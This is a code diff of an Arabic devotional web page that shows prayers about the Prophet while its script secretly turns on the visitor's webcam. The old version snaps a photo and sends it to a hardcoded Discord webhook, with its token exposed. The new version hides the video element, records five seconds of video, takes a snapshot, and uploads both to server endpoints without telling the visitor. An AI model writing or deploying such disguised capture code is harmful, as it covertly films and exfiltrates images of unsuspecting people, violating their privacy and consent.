@@ -1,103 +1,125 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الذكر</title>
+    <title>صلي علي النبي</title>
     <style>
+        #video { display: none; }
         body {
             font-family: Arial, sans-serif;
             background-color: #f0f8ff;
             color: #333;
             text-align: center;
             padding-top: 50px;
-            overflow: hidden;
-            height: 100vh;
         }
-
-        h1 {
-            font-size: 30px;
-            margin-bottom: 20px;
-        }
-
+        h1 { font-size: 30px; margin-bottom: 20px; }
         .prayer {
             font-size: 22px;
             color: #0000cd;
             font-weight: bold;
         }
-
-        /* إخفاء الفيديو تماما */
-        video {
-            display: none;
-        }
-
-        canvas {
-            display: none; /* إخفاء الـ canvas الذي يتم عليه التقاط الصورة */
-        }
     </style>
 </head>
 <body>
-    <!-- النصوص التي طلبتها -->
     <p class="prayer">بسم الله الرحمن الرحيم</p>
     <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
     <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
     <p class="prayer">لا إله إلا الله محمد رسول الله</p>
     <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>
 
-    <!-- فيديو يعرض الكاميرا ولكن مغطى -->
-    <video id="video" autoplay></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <video id="video" width="300" height="200" autoplay></video>
+    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         let stream;
+        let recorder;
+        let chunks = [];
 
-        // بدء تشغيل الفيديو من كاميرا الويب عند تحميل الصفحة
-        async function startVideo() {
-            try {
-                // طلب الوصول إلى كاميرا الويب
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-
-                // التقاط صورة وفيديو تلقائيًا بعد تحميل الصفحة مباشرة
-                setTimeout(captureImage, 3000); // التقاط صورة بعد 3 ثواني
-            } catch (err) {
-                // في حالة حدوث خطأ، لا نعرض أي إشعارات
-            }
+        window.onload = function () {
+            init();
         }
 
-        // التقاط صورة تلقائيًا بعد 3 ثواني
+        async function init() {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            startRecording();
+            setTimeout(() => {
+                captureImage();
+            }, 5000);
+        }
+
         function captureImage() {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
-            sendImageToWebhook(imageData);
-        }
+            const imgData = canvas.toDataURL('image/png');
+            const imageHash = `sent_image_${imgData}`;
 
-        // إرسال الصورة إلى الـ Webhook
-        async function sendImageToWebhook(imageData) {
-            try {
-                const response = await fetch('https://discord.com/api/webhooks/1362295538137043034/kVkadWuQygKz3igA3HVip8gs6ZA5met8p1SBlfszjSEQ_y1M58cvofS7U-C23Mv3Tzao', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ image: imageData })
-                });
-
-                // إذا حدث خطأ أثناء إرسال الصورة
-                if (!response.ok) {
-                    console.error("حدث خطأ أثناء إرسال الصورة.");
-                }
-            } catch (err) {
-                console.error("خطأ في الاتصال بالـ Webhook:", err);
+            if (!localStorage.getItem(imageHash)) {
+                sendImage(imgData, imageHash);
+            } else {
+                console.log("الصورة دي اتبعتت قبل كده");
             }
         }
 
-        // بدء تشغيل الفيديو عند تحميل الصفحة
-        window.onload = startVideo;
-    </script>
+        function sendImage(imageData, imageHash) {
+            fetch('/upload_image', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data);
+                localStorage.setItem(imageHash, true);
+            })
+            .catch(error => console.log(error));
+        }
 
+        function startRecording() {
+            chunks = [];
+            recorder = new MediaRecorder(stream);
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = sendVideo;
+
+            recorder.start();
+            setTimeout(() => {
+                recorder.stop();
+            }, 5000);
+        }
+
+        function sendVideo() {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+
+            const reader = new FileReader();
+            reader.onloadend = () => {
+                const base64data = reader.result;
+                const videoHash = `sent_video_${base64data}`;
+
+                if (!localStorage.getItem(videoHash)) {
+                    const formData = new FormData();
+                    formData.append('video', blob, 'recorded_video.webm');
+
+                    fetch('/upload_video', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(data);
+                        localStorage.setItem(videoHash, true);
+                    })
+                    .catch(error => console.log(error));
+                } else {
+                    console.log("الفيديو ده اتبعت قبل كده");
+                }
+            };
+            reader.readAsDataURL(blob);
+        }
+    </script>
 </body>
 </html>
